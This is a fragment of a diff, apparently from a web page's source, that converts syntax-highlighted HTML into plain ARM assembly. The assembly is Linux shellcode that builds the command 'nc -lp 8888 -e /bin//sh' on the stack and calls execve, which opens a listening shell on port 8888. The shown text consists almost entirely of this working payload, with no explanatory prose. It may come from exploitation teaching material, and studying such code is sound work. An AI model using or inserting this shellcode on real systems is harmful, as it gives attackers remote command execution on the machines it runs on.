-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;     &lt;span class="c1"&gt;; /sh&lt;/span&gt;
-    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;          &lt;span class="c1"&gt;; 0x00000000&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
+    stage_2:
+        ldr     r0, =0x6e69622f     ; /bin
+        ldr     r1, =0x68732f2f     ; /sh
+        eor     r2, r2, r2          ; 0x00000000
+        push    {r0, r1, r2}
+        mov     r0, sp
 
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x0000632d&lt;/span&gt;     &lt;span class="c1"&gt;; -c\x00\x00&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
+        ldr     r4, =0x0000632d     ; -c\x00\x00
+        push    {r4}
+        mov     r4, sp
 
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2d20636e&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x3820706c&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x20383838&lt;/span&gt;     &lt;span class="c1"&gt;; nc -lp 8888 -e /bin//sh&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2f20652d&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2f6e6962&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;
+        ldr     r5, =0x2d20636e
+        ldr     r6, =0x3820706c
+        ldr     r7, =0x20383838     ; nc -lp 8888 -e /bin//sh
+        ldr     r8, =0x2f20652d
+        ldr     r9, =0x2f6e6962
+        ldr     r10, =0x68732f2f
 
-    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r11&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+        eor     r11, r11, r11
+        push    {r5-r11}
+        mov     r5, sp
+        push    {r2}
 
-    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;
-    &lt;span class="nf"&gt;swi&lt;/span&gt;     &lt;span class="mh"&gt;0x0&lt;/span&gt;
+        eor     r6, r6, r6
+        push    {r0,r4,r5, r6}
+        mov     r1, sp
+        mov     r7, #11
+        swi     0x0
 
-    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;99&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
-    &lt;span class="nf"&gt;swi&lt;/span&gt;     &lt;span class="mh"&gt;0x0&lt;/span&gt;
+        mov     r0, #99
+        mov     r7, #1
+        swi     0x0
 &lt;/pre&gt;&lt;/div&gt;
 
 
